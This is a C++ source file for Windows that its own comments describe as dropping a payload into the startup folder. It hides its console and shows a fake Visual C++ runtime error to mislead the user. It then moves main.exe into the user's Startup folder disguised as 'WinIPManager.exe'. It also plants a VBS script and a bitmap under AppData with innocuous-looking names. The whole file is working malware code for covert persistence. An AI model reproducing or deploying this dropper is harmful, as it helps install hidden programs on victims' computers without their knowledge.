// this file dropps the payload into the startup folder
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <Lmcons.h>

int main(int argc, char* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	// show fake runtime error
	MessageBox
	(
		NULL,
		"Runtime Error!\nProgram: \n\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application\'s support team for more information.",
		"Microsoft Visual C++ Runtime Library",
		MB_OK | MB_ICONSTOP
	);
	
	
	// get path for payload to be moved to
	TCHAR username [ UNLEN + 1 ];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	
	
	std::string newPayloadDirectory = "C:\\Users\\";
	newPayloadDirectory += username;
	newPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\WinIPManager.exe";
	
	std::string otherPayloadDirectory = "C:\\Users\\";
	otherPayloadDirectory += username;
	otherPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinIPManager.exe";
	
	std::string pictureDirectory = "C:\\Users\\";
	pictureDirectory += username;
	pictureDirectory += "\\AppData\\Local\\picture.bmp";
	
	std::string ttsDirectory = "C:\\Users\\";
	ttsDirectory += username;
	ttsDirectory += "\\AppData\\Local\\Win32Man.vbs";

	// move the payload to startup
	MoveFile("tts.vbs", ttsDirectory.c_str());
	MoveFile("picture.bmp", pictureDirectory.c_str());
	MoveFile("main.exe", newPayloadDirectory.c_str());
	MoveFile("main.exe", otherPayloadDirectory.c_str());
	
	return 0;
}
